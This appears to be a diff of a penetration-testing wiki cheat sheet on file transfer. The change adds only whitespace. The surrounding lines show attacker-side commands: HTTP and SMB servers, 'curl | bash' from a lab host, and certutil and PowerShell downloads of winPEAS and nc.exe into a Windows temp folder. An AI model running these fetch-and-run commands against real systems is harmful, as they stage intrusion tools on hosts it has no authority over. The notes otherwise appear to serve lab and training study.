@@ -15,6 +15,7 @@ Part of [[Shells]]. Related: [[Reverse & Bind Shells]] · [[File Transfer Cheat 
 ```bash
 python3 -m http.server 80
 ```
+
 ```bash
 impacket-smbserver share . -smb2support        # SMB share for Windows pulls
 ```
@@ -34,9 +35,11 @@ curl http://10.10.14.5/s.sh | bash        # run without saving
 ```cmd
 certutil -urlcache -f http://10.10.14.5/winPEAS.exe winPEAS.exe
 ```
+
 ```powershell
 iwr http://10.10.14.5/winPEAS.exe -OutFile C:\Windows\Temp\wp.exe
 ```
+
 ```powershell
 (New-Object Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe','C:\Windows\Temp\nc.exe')
 ```
